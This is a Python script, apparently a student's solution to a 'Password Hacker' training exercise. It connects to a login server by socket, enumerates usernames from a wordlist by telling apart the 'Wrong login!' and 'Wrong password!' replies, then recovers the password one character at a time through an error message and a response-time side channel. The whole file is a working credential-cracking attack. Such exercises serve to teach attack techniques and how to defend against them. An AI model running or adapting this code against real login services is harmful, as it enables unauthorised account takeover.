import socket
import argparse
import itertools
import json
import string
import time

filename = "C:\\Users\\KoliaS-PC\\PycharmProjects\\Password Hacker\\Password Hacker\\task\hacking\\logins.txt"
logins_list = list(item.replace("\n", "") for item in open(filename))

psw_list = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits)

save_psw = ""
return_code = 0
login_data = {"login": "", "password": ""}

# take argums from command line
argums = argparse.ArgumentParser("ip, port")
argums.add_argument("ip_address")
argums.add_argument("port")
str_arg = argums.parse_args()


def check_answer(data):
    result = json.loads(data)
    if result['result'] == "Wrong login!":
        return 1
    elif result['result'] == "Wrong password!":
        return 2
    elif result['result'] == "Exception happened during login":
        return 3
    elif result['result'] == "Connection success!":
        return 100
    return 0


def generate_req(log, psw):
    login_data['login'] = log
    login_data['password'] = psw
    return json.dumps(login_data)


with socket.socket() as cli_socket:
    cli_socket.connect((str_arg.ip_address, int(str_arg.port)))

    for login in logins_list:
        cli_socket.send("".join(generate_req(login, '')).encode())
        if check_answer(cli_socket.recv(1024)) == 2:
            break

    while return_code != 100:
        for char in psw_list:
            time_stamp_start = time.time()
            cli_socket.send("".join(generate_req(login, save_psw + char)).encode())
            recived_data = cli_socket.recv(1024)
            time_diff = round(time.time() - time_stamp_start ,3)
            return_code = check_answer(recived_data)
            if time_diff > 0.05:
                return_code = 3

            if return_code == 3:
                save_psw = save_psw + char
            elif return_code == 100:
                psw_found = 1
                print(generate_req(login, save_psw + char))
                break

